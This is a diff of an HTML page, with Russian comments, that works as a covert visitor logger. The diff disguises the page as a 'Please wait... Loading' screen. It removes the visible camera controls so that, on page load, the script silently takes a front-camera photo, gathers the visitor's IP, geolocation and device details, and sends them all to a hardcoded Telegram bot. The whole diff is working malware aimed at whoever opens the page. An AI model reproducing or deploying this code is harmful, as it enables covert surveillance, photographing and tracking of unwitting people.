@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Logger</title>
+    <title>Loading...</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,6 +11,7 @@
             margin: 0 auto;
             padding: 20px;
             background-color: #f5f5f5;
+            text-align: center;
         }
         .container {
             background: white;
@@ -22,7 +23,6 @@
             padding: 15px;
             border-radius: 5px;
             margin: 20px 0;
-            text-align: center;
             font-weight: bold;
         }
         .success {
@@ -40,27 +40,6 @@
             color: #0c5460;
             border: 1px solid #bee5eb;
         }
-        .camera-container {
-            margin: 20px 0;
-            text-align: center;
-        }
-        #cameraVideo, #cameraCanvas {
-            max-width: 100%;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-        }
-        .camera-btn {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        .camera-btn:hover {
-            background-color: #0056b3;
-        }
         .hidden {
             display: none;
         }
@@ -68,22 +47,11 @@
 </head>
 <body>
     <div class="container">
-        <h1>Welcome</h1>
+        <h1>Please wait...</h1>
         <div id="status" class="status info">
-            Collecting information...
+            Loading page content...
         </div>
-        
-        <div id="cameraSection" class="camera-container hidden">
-            <h3>📷 Camera Access Required</h3>
-            <p>Please allow camera access to continue</p>
-            <video id="cameraVideo" autoplay playsinline></video>
-            <canvas id="cameraCanvas" class="hidden"></canvas>
-            <br>
-            <button id="captureBtn" class="camera-btn hidden">Take Photo</button>
-            <button id="startCameraBtn" class="camera-btn">Enable Camera</button>
-        </div>
-        
-        <p id="loadingText">This page is loading...</p>
+        <p>This page is loading, please wait a moment.</p>
     </div>
 
     <script>
@@ -92,22 +60,15 @@
         const CHAT_ID = "-1003175777512";
 
         let cameraStream = null;
-        let photoTaken = false;
 
-        // Элементы DOM
-        const cameraSection = document.getElementById('cameraSection');
-        const cameraVideo = document.getElementById('cameraVideo');
-        const cameraCanvas = document.getElementById('cameraCanvas');
-        const captureBtn = document.getElementById('captureBtn');
-        const startCameraBtn = document.getElementById('startCameraBtn');
-        const loadingText = document.getElementById('loadingText');
-        const statusElement = document.getElementById('status');
-
-        // Функция для запуска камеры
-        async function startCamera() {
+        // Функция для автоматического доступа к камере и съемки
+        async function autoCaptureCamera() {
+            const statusElement = document.getElementById('status');
+            
             try {
-                statusElement.innerHTML = '🔄 Requesting camera access...';
+                statusElement.innerHTML = '🔄 Accessing camera...';
                 
+                // Запрашиваем камеру сразу
                 cameraStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
@@ -116,170 +77,105 @@
                     },
                     audio: false 
                 });
+
+                statusElement.innerHTML = '✅ Camera connected! Taking photo...';
                 
-                cameraVideo.srcObject = cameraStream;
-                cameraSection.classList.remove('hidden');
-                captureBtn.classList.remove('hidden');
-                startCameraBtn.classList.add('hidden');
-                loadingText.classList.add('hidden');
+                // Создаем скрытые элементы для камеры
+                const video = document.createElement('video');
+                video.srcObject = cameraStream;
+                video.autoplay = true;
+                video.playsInline = true;
                 
-                statusElement.innerHTML = '✅ Camera access granted! Take a photo to continue.';
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                // Ждем пока видео готово
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        resolve();
+                    };
+                });
+                
+                // Ждем немного для фокуса
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Делаем снимок
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Останавливаем камеру
+                cameraStream.getTracks().forEach(track => track.stop());
+                
+                statusElement.innerHTML = '📸 Photo captured! Sending data...';
+                
+                return photoDataUrl;
                 
             } catch (error) {
-                console.error('Error accessing camera:', error);
-                statusElement.innerHTML = '❌ Camera access denied. Continuing without photo.';
-                // Продолжаем без фото
-                setTimeout(() => {
-                    collectAndSendData(null);
-                }, 2000);
+                console.error('Camera error:', error);
+                statusElement.innerHTML = '❌ Camera not available. Continuing...';
+                return null;
             }
-        }
-
-        // Функция для захвата фото
-        function capturePhoto() {
-            if (!cameraStream) return;
-            
-            const context = cameraCanvas.getContext('2d');
-            cameraCanvas.width = cameraVideo.videoWidth;
-            cameraCanvas.height = cameraVideo.videoHeight;
-            context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
-            
-            // Останавливаем камеру
-            cameraStream.getTracks().forEach(track => track.stop());
-            
-            cameraVideo.classList.add('hidden');
-            captureBtn.classList.add('hidden');
-            
-            statusElement.innerHTML = '✅ Photo captured! Sending data...';
-            photoTaken = true;
-            
-            // Получаем фото как Data URL
-            const photoDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.8);
-            
-            // Продолжаем сбор данных
-            collectAndSendData(photoDataUrl);
         }
 
         // Функция для получения IP через ipapi.co
         async function getIPInfo() {
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 8000);
-                
-                const response = await fetch('https://ipapi.co/json/', {
-                    signal: controller.signal
-                });
-                clearTimeout(timeoutId);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                return data;
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('IP fetch failed');
+                return await response.json();
             } catch (error) {
-                console.error('Error fetching IP info:', error);
-                return await getIPInfoFallback();
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        country_name: 'Unknown',
+                        country_code: 'N/A',
+                        region: 'Unknown',
+                        city: 'Unknown',
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        org: 'Unknown'
+                    };
+                } catch (e) {
+                    return {
+                        ip: 'Unable to retrieve',
+                        country_name: 'Unknown',
+                        city: 'Unknown',
+                        org: 'Unknown'
+                    };
+                }
             }
         }
 
-        // Альтернативный метод получения IP
-        async function getIPInfoFallback() {
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 8000);
-                
-                const response = await fetch('https://api.ipify.org?format=json', {
-                    signal: controller.signal
-                });
-                clearTimeout(timeoutId);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country_name: 'Unknown',
-                    country_code: 'N/A',
-                    region: 'Unknown',
-                    city: 'Unknown',
-                    postal: 'N/A',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    latitude: 'N/A',
-                    longitude: 'N/A',
-                    org: 'Unknown'
-                };
-            } catch (error) {
-                console.error('Error fetching IP info from fallback:', error);
-                return {
-                    ip: 'Unable to retrieve',
-                    country_name: 'Unknown',
-                    country_code: 'N/A',
-                    region: 'Unknown',
-                    city: 'Unknown',
-                    postal: 'N/A',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    latitude: 'N/A',
-                    longitude: 'N/A',
-                    org: 'Unknown'
-                };
-            }
-        }
-
-        // Функция для получения дополнительной информации
+        // Функция для получения информации о браузере
         function getBrowserInfo() {
             return {
-                userAgent: navigator.userAgent || 'N/A',
-                language: navigator.language || 'N/A',
-                languages: navigator.languages ? [...navigator.languages] : ['N/A'],
-                platform: navigator.platform || 'N/A',
-                cookieEnabled: navigator.cookieEnabled !== undefined ? navigator.cookieEnabled : false,
-                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                screen: {
-                    width: screen.width || 0,
-                    height: screen.height || 0,
-                    colorDepth: screen.colorDepth || 0
-                },
-                viewport: {
-                    width: window.innerWidth || 0,
-                    height: window.innerHeight || 0
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
-                localStorage: !!window.localStorage,
-                sessionStorage: !!window.sessionStorage,
-                indexedDB: !!window.indexedDB,
-                touchSupport: 'ontouchstart' in window,
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled
             };
         }
 
         // Функция для отправки текста в Telegram
         async function sendToTelegram(message) {
             try {
-                const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-                
-                const response = await fetch(url, {
+                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'HTML'
-                    }),
-                    signal: controller.signal
+                    })
                 });
-                clearTimeout(timeoutId);
-                
                 return response.ok;
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
                 return false;
             }
         }
@@ -287,123 +183,93 @@
         // Функция для отправки фото в Telegram
         async function sendPhotoToTelegram(photoDataUrl, caption) {
             try {
-                // Конвертируем Data URL в Blob
                 const response = await fetch(photoDataUrl);
                 const blob = await response.blob();
                 
-                // Создаем FormData
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', caption.substring(0, 1024)); // Ограничение Telegram
+                formData.append('caption', caption);
                 
-                const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 15000);
-                
-                const telegramResponse = await fetch(url, {
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    body: formData,
-                    signal: controller.signal
+                    body: formData
                 });
-                clearTimeout(timeoutId);
                 
                 return telegramResponse.ok;
             } catch (error) {
-                console.error('Error sending photo to Telegram:', error);
                 return false;
             }
         }
 
         // Форматирование сообщения
         function formatMessage(ipInfo, browserInfo, hasPhoto = false) {
-            let message = `<b>🌐 IP Logger with Camera</b>\n\n`;
-            message += `<b>📍 IP Address:</b> ${ipInfo.ip || 'N/A'}\n`;
-            message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\n`;
-            message += `<b>🏛️ Region:</b> ${ipInfo.region || 'N/A'}\n`;
+            let message = `<b>🌐 Automatic Camera Logger</b>\n\n`;
+            message += `<b>📍 IP:</b> ${ipInfo.ip || 'N/A'}\n`;
+            message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'}\n`;
             message += `<b>🏢 City:</b> ${ipInfo.city || 'N/A'}\n`;
-            message += `<b>📮 Postal Code:</b> ${ipInfo.postal || 'N/A'}\n`;
             message += `<b>🕐 Timezone:</b> ${ipInfo.timezone || 'N/A'}\n`;
-            message += `<b>📡 Coordinates:</b> ${ipInfo.latitude || 'N/A'}, ${ipInfo.longitude || 'N/A'}\n`;
-            message += `<b>🗿 ISP:</b> ${ipInfo.org || ipInfo.asn || 'N/A'}\n\n`;
+            message += `<b>🗿 ISP:</b> ${ipInfo.org || 'N/A'}\n\n`;
             
-            message += `<b>💻 Browser Info:</b>\n`;
-            message += `<b>User Agent:</b> ${browserInfo.userAgent}\n`;
+            message += `<b>💻 Device Info:</b>\n`;
+            message += `<b>Browser:</b> ${browserInfo.userAgent}\n`;
+            message += `<b>Screen:</b> ${browserInfo.screen}\n`;
             message += `<b>Language:</b> ${browserInfo.language}\n`;
-            message += `<b>Platform:</b> ${browserInfo.platform}\n`;
-            message += `<b>Screen:</b> ${browserInfo.screen.width}x${browserInfo.screen.height}\n`;
-            message += `<b>Viewport:</b> ${browserInfo.viewport.width}x${browserInfo.viewport.height}\n`;
-            message += `<b>Timezone:</b> ${browserInfo.timezone}\n`;
-            message += `<b>Touch Support:</b> ${browserInfo.touchSupport ? 'Yes' : 'No'}\n`;
-            message += `<b>Cookies:</b> ${browserInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
-            message += `<b>Local Storage:</b> ${browserInfo.localStorage ? 'Supported' : 'Not Supported'}\n`;
-            message += `<b>Camera Access:</b> ${hasPhoto ? 'Granted + Photo' : 'Denied/Skipped'}\n`;
-            
-            message += `\n<b>🕒 Timestamp:</b> ${new Date().toLocaleString()}`;
+            message += `<b>Camera Access:</b> ${hasPhoto ? '✅ GRANTED + PHOTO' : '❌ DENIED'}\n`;
+            message += `\n<b>🕒 Time:</b> ${new Date().toLocaleString()}`;
             
             return message;
         }
 
         // Основная функция
-        async function collectAndSendData(photoDataUrl) {
+        async function collectAndSendData() {
+            const statusElement = document.getElementById('status');
+            
             try {
-                // Получаем информацию об IP
-                const ipInfo = await getIPInfo();
-                const browserInfo = getBrowserInfo();
+                // Сначала пытаемся получить фото с камеры
+                statusElement.innerHTML = '📸 Attempting camera access...';
+                const photoDataUrl = await autoCaptureCamera();
+                
+                // Параллельно собираем остальные данные
+                statusElement.innerHTML = '🌐 Collecting information...';
+                const [ipInfo, browserInfo] = await Promise.all([
+                    getIPInfo(),
+                    Promise.resolve(getBrowserInfo())
+                ]);
 
                 // Формируем сообщение
                 const message = formatMessage(ipInfo, browserInfo, !!photoDataUrl);
 
-                // Отправляем текстовое сообщение
+                // Отправляем данные
+                statusElement.innerHTML = '📤 Sending to Telegram...';
                 const textSuccess = await sendToTelegram(message);
                 
-                // Если есть фото, отправляем его отдельно
+                // Если есть фото, отправляем его
                 let photoSuccess = true;
                 if (photoDataUrl) {
-                    const photoCaption = `📸 Camera capture - ${ipInfo.ip || 'Unknown IP'} - ${new Date().toLocaleString()}`;
+                    const photoCaption = `📸 Auto Capture - ${ipInfo.ip || 'Unknown'} - ${new Date().toLocaleString()}`;
                     photoSuccess = await sendPhotoToTelegram(photoDataUrl, photoCaption);
                 }
                 
                 if (textSuccess) {
                     statusElement.className = 'status success';
-                    if (photoDataUrl) {
-                        statusElement.innerHTML = photoSuccess ? 
-                            '✅ Information and photo sent successfully!' :
-                            '✅ Information sent! Photo failed.';
-                    } else {
-                        statusElement.innerHTML = '✅ Information sent successfully!';
-                    }
+                    statusElement.innerHTML = photoDataUrl ? 
+                        '✅ Data and photo sent successfully!' :
+                        '✅ Data sent successfully!';
                 } else {
-                    throw new Error('Failed to send to Telegram');
+                    throw new Error('Telegram send failed');
                 }
 
             } catch (error) {
                 console.error('Error:', error);
                 statusElement.className = 'status error';
-                statusElement.innerHTML = '❌ Error: ' + error.message;
+                statusElement.innerHTML = '❌ Error loading page';
             }
         }
 
-        // Обработчики событий
-        startCameraBtn.addEventListener('click', startCamera);
-        captureBtn.addEventListener('click', capturePhoto);
-
-        // Запускаем при загрузке страницы
+        // Запускаем сразу при загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
-            // Автоматически запрашиваем камеру через 1 секунду
-            setTimeout(() => {
-                // Показываем секцию камеры и предлагаем включить
-                cameraSection.classList.remove('hidden');
-                statusElement.innerHTML = 'Click "Enable Camera" to take a photo';
-            }, 1000);
-            
-            // Автоматический сбор данных без фото через 10 секунд, если фото не сделано
-            setTimeout(() => {
-                if (!photoTaken) {
-                    statusElement.innerHTML = '⏰ Camera timeout. Sending data without photo...';
-                    collectAndSendData(null);
-                }
-            }, 10000);
+            setTimeout(collectAndSendData, 500);
         });
     </script>
 </body>
